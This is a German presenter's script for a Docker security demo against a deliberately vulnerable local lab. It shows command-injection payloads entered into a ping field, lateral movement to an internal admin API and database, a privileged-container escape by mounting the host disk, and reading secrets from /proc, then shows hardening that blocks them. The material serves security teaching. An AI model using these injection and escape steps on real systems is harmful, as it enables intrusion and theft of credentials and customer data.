# Demo-Drehbuch: Docker Container Security

---

## Schritt 0 — Setup (vor dem Start, nicht live)

### Container starten

```bash
cd docker-container-security
docker compose up -d --build
```

### Prüfen ob alles läuft

```bash
docker compose ps
```

Erwartete Ausgabe — alle drei Container müssen `running` zeigen:

```
NAME      STATUS
webapp    running
db        running
admin     running
```

### Browser-Tab öffnen

```
http://localhost:5001
```

### Terminal für die Demo bereithalten

---

## Angriff 1: Command Injection

**Was wird gezeigt:** Nutzereingabe wird ungefiltert als Shell-Befehl ausgeführt.

### 1.1 — Normaler Ping

Im Browser im Ping-Feld eingeben:

```
8.8.8.8
```

Erwartete Ausgabe:
```
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: ...
```
---

### 1.2 — Sind wir im Container?

> ⚠️ **Geändert:** Der ursprüngliche Befehl `cat /proc/1/cgroup` zeigt auf Systemen mit cgroup v2 nur `0::/` statt eines Docker-Pfads. Der folgende Befehl funktioniert zuverlässig auf allen Systemen.

Im Ping-Feld eingeben:

```
8.8.8.8; cat /.dockerenv && echo "Wir sind in einem Container"
```

Erwartete Ausgabe:
```
Wir sind in einem Container
```

> 💬 *„Die Datei /.dockerenv existiert nur innerhalb von Docker-Containern. Damit ist bewiesen: wir befinden uns in einem Container. Jetzt schauen wir was wir von hier aus noch erreichen können."*
---

### 1.3 — Command Injection: Wer bin ich?

Im Ping-Feld eingeben:

```
8.8.8.8; whoami
```

Erwartete Ausgabe (ganz unten im Ergebnis):
```
root
```

> 💬 *„Das Semikolon beendet den Ping-Befehl und startet einen neuen. Die App übergibt die Eingabe ungefiltert an die Shell — wir führen jetzt beliebige Befehle als Root aus."*

---

## Angriff 2: Lateral Movement

**Was wird gezeigt:** Ein kompromittierter Container kann andere interne Dienste direkt ansprechen, weil keine Netzwerksegmentierung existiert.

### 2.1 — Internen Admin-Service angreifen

Im Ping-Feld eingeben:

```
; curl -s http://admin:8080/api/config
```

Erwartete Ausgabe:
```json
{
  "admin_users": [...],
  "internal_api_keys": {
    "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
    "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "database_master_password": "SuperSecret123!"
  }
}
```

> 💬 *„Der Admin-Service ist nur im internen Netz — kein Browser weltweit kann ihn direkt aufrufen. Aber weil die Webapp im selben Netz hängt, können wir ihn über Docker-DNS ansprechen und alle API-Keys stehlen."*

---

### 2.2 — Datenbank direkt abfragen

> ⚠️ **Geändert:** Der Parameter `--ssl=0` wurde hinzugefügt, da MySQL sonst eine TLS-Fehlermeldung wirft (`ERROR 2026: TLS/SSL error: self-signed certificate in certificate chain`).

Im Ping-Feld eingeben:

```
; mysql -h db -u root -proot --ssl=0 -e "SELECT * FROM kundenportal.kunden"
```

Erwartete Ausgabe:
```
id  vorname  nachname  email                        kreditkarte           kontostand
1   Anna     Müller    anna.mueller@example.com     4111-XXXX-XXXX-1234   15420.50
2   Thomas   Schmidt   thomas.schmidt@example.com   5500-XXXX-XXXX-5678   8930.00
...
```

> 💬 *„Das Datenbankpasswort ist 'root' — und die Webapp hat direkten Netzwerkzugriff auf die DB. Kundendaten, Kreditkarteninformationen — alles in einer Anfrage."*

---

## Angriff 3: Container Escape

**Was wird gezeigt:** Ein Container mit `privileged: true` kann das Host-Dateisystem einhängen und hat damit vollen Zugriff auf den Host.

> ⚠️ **Hinweis für Docker Desktop (macOS/Windows):** Das Einhängen funktioniert, zeigt aber das Dateisystem der internen Linux-VM, nicht den Mac/Windows-Rechner. Das Prinzip ist identisch — kurz erklären, nicht als Fehler behandeln.

---

### 3.1 — Privilegierten Modus erkennen

> ⚠️ **Geändert:** `fdisk` ist im Container nicht installiert. Stattdessen wird `lsblk` verwendet, das zuverlässig funktioniert.

Im Ping-Feld eingeben:

```
8.8.8.8; lsblk
```

Erwartete Ausgabe (Block-Devices des Hosts sind sichtbar):
```
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
vda    254:0    0 926.4G  0 disk
└─vda1 254:1    0 926.4G  0 part /mnt/host
                                 /etc/hosts
                                 /etc/hostname
                                 /etc/resolv.conf
```

> 💬 *„Ein normaler Container sieht keine Festplatten des Hosts. Weil dieser Container mit privileged: true läuft, sehen wir hier die echten Block-Devices des Hosts."*

---

### 3.2 — Device-Name und Mountpoint prüfen

Aus der `lsblk`-Ausgabe ablesen: Die Host-Partition (hier `vda1`) ist bereits unter `/mnt/host` gemountet.

> ⚠️ **Hinweis:** In Docker Desktop ist die Partition oft schon automatisch gemountet. Schritt 3.3 (manuelles Mounten) kann dann übersprungen werden.

---

### 3.3 — Host-Dateisystem einhängen (nur falls nötig)

Nur ausführen, wenn `/mnt/host` in der `lsblk`-Ausgabe **nicht** als Mountpoint erscheint. Den Device-Namen aus 3.2 verwenden:

```
8.8.8.8; mkdir -p /mnt/host && mount /dev/vda1 /mnt/host 2>/dev/null; ls /mnt/host/
```

Falls `/mnt/host` bereits gemountet ist → direkt zu 3.4.

---

### 3.4 — Host-Dateien lesen

> ⚠️ **Geändert:** Unter Docker Desktop enthält die gemountete Partition die Docker-Datenpartition der VM, nicht ein vollständiges Linux-Root-Dateisystem. Daher existieren `/etc/shadow`, `/etc/passwd` etc. dort nicht. Stattdessen zeigen wir die Machine-ID und die Docker-internen Daten.

Im Ping-Feld eingeben:

```
8.8.8.8; cat /mnt/host/machine-id
```

Erwartete Ausgabe: Eine eindeutige Host-Kennung (z.B. `a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5`).

Dann:

```
8.8.8.8; ls /mnt/host/docker/
```

Erwartete Ausgabe (Docker-interne Verzeichnisse):
```
buildkit  containers  image  network  overlay2  plugins  runtimes  swarm  tmp  volumes
```

> 💬 *„Wir lesen die Machine-ID des Hosts und sehen die internen Docker-Daten — Images, Volumes, Netzwerke aller Container. Ein Angreifer könnte von hier aus andere Container manipulieren oder Daten extrahieren. Der Container ist ausgebrochen."*

---

## Angriff 4: Secrets in Umgebungsvariablen

**Was wird gezeigt:** Passwörter und API-Keys in Env-Vars sind für jeden Prozess im Container lesbar.

### Im Ping-Feld eingeben:

```
; cat /proc/1/environ | tr '\0' '\n'
```

Erwartete Ausgabe enthält:
```
DB_PASSWORD=root
SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
JWT_SECRET=my-super-secret-jwt-signing-key-2024
```

> 💬 *„Alle Umgebungsvariablen des Prozesses liegen in /proc im Klartext. Das ist die häufigste Art wie Secrets in Docker-Umgebungen übergeben werden — und einer der häufigsten Fehler in der Praxis."*

---

---

## Härtung

**Was wird gezeigt:** Dieselben Angriffe schlagen in der gehärteten Version fehl.

### Im Terminal: Umschalten auf die gehärtete Version

```bash
docker compose down
docker compose -f docker-compose.hardened.yml up -d --build
```

---

### H.1 — Command Injection schlägt fehl

Im Ping-Feld eingeben:

```
8.8.8.8; whoami
```

Erwartete Ausgabe:
```
Ungültige Eingabe! Nur IP-Adressen und Hostnamen erlaubt.
```

> 💬 *„Input-Validierung mit Regex-Whitelist blockiert alles außer gültigen IPs und Hostnamen."*

---

### H.2 — Rechte im Container prüfen

Im Terminal:

```bash
docker compose -f docker-compose.hardened.yml exec webapp sh
```

Dann im Container:

```bash
whoami
```
```
appuser
```

```bash
fdisk -l
```
```
fdisk: cannot open /dev/sda: Permission denied
```

```bash
curl http://admin:8080
```
```
curl: (6) Could not resolve host: admin
```

Mit `exit` verlassen.

> 💬 *„Non-Root-User, keine Capabilities, keine Netzwerkverbindung zum Backend — selbst wenn ein Angreifer reinkäme, wäre der Schaden minimal."*

---

### Im Terminal aufräumen

```bash
docker compose -f docker-compose.hardened.yml down
```

---

## Troubleshooting

| Problem | Lösung |
|---|---|
| Browser zeigt nichts | `docker compose ps` prüfen — alle Container `running`? |
| MySQL antwortet nicht | Nochmal 30 Sek warten, dann `; mysql ...` erneut |
| MySQL TLS-Fehler | `--ssl=0` zum mysql-Befehl hinzufügen |
| `/proc/1/cgroup` zeigt nur `0::/` | cgroup v2 — stattdessen `cat /.dockerenv` verwenden |
| `fdisk -l` zeigt nichts | `fdisk` nicht installiert — `lsblk` verwenden |
| `/mnt/host/etc/shadow` nicht gefunden | Docker Desktop zeigt VM-Datenpartition — `cat /mnt/host/machine-id` und `ls /mnt/host/docker/` verwenden |
| Device-Name unbekannt | `; lsblk` ausführen und den richtigen Namen ablesen |
| SSTI zeigt `{{7*7}}` als Text | URL direkt in Adressleiste eingeben, nicht über Formular |
| Port 5001 nicht erreichbar | `docker compose ps` — läuft webapp? Sonst `docker compose logs webapp` |
| Gehärtete Version startet nicht | `docker compose down` sicherstellen, dann erneut `up` |
